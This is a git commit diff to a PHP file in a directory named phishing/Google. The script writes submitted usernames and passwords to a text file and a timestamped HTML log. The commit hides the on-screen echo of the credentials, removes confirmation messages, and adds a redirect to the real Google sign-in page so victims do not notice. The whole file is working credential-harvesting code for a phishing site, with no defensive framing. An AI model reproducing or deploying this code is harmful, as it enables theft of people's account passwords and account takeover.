077a6b1279a4118942c899e9d9777e7533a111c2
moseleygj <moseleygj@gmail.com>
2017-12-18 13:14:50 -0500

    updateLogic working

--- phishing/Google/writefile.php
+++ phishing/Google/writefile.php
@@ -1,8 +1,8 @@
 <html>
-<body>
+<body><!--
 <b>username:</b> <?php echo $_POST["userName"];?><br>
 <b>password:</b> <?php echo $_POST["passWord"];?>
-
+-->
 <?php
 
 $myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
@@ -10,7 +10,6 @@ $passW = $_POST["passWord"];
 $usrN = $_POST["userName"];
 fwrite($myfile, $usrN .":" . $passW . "\n");
 
-echo "<br>file written.";
 fclose($myfile);
 
 
@@ -19,10 +18,12 @@ $passW = $_POST["passWord"];
 $usrN = $_POST["userName"];
 fwrite($myHTMLFile, "<b>Username:&nbsp</b>" . $usrN ."<br><b>Password:&nbsp</b>" . $passW . "<br><font color='red'>" . date("l jS \of F Y h:i:s A") . "</font><br><hr>");
 
-echo "<br>file written.";
 fclose($myHTMLFile);
 
-
 ?>
+
+<script type="text/javascript">
+window.location.href = "https://accounts.google.com/";
+</script>
 </body>
 </html>
